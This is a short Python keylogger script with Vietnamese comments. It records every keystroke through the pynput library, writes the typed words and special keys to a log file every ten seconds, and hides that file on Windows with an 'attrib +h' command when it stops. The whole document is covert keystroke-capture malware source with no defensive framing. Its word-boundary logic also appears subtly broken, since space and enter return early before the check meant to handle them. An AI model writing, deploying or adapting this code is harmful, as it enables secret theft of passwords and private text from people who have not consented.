from pynput import keyboard
import time
import os
import threading

# ===== CẤU HÌNH =====
FLUSH_INTERVAL = 10  # giây
log_file = "key_log.txt"
log_buffer = []
log_lock = threading.Lock()
current_word = ""

# ===== GHI LOG RA FILE =====
def flush_logs():
    global log_buffer
    with log_lock:
        if log_buffer:
            with open(log_file, "a", encoding="utf-8") as f:
                for line in log_buffer:
                    f.write(line + "\n")
            log_buffer.clear()

# ===== ẨN FILE TRÊN WINDOWS =====
def hide_file(path):
    try:
        os.system(f'attrib +h "{path}"')
    except:
        pass

# ===== GHI NHẬN PHÍM =====
def on_press(key):
    global current_word

    try:
        k = key.char
        current_word += k
    except AttributeError:
        log_buffer.append(f"[SPECIAL] {key}")
        return

    if key == keyboard.Key.space or key == keyboard.Key.enter:
        if current_word:
            log_buffer.append(f"[TEXT] {current_word}")
            current_word = ""

# ===== LUỒNG TỰ ĐỘNG ĐẨY DỮ LIỆU =====
def auto_flush():
    while True:
        time.sleep(FLUSH_INTERVAL)
        flush_logs()

# ===== KỊCH BẢN THOÁT =====
def cleanup():
    flush_logs()
    hide_file(log_file)
    print("[+] Nhật ký đã được bảo vệ và ẩn đi.")

# ===== KHỞI CHẠY =====
if __name__ == "__main__":
    flush_thread = threading.Thread(target=auto_flush, daemon=True)
    flush_thread.start()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()
        print("[!] Dừng chương trình.")
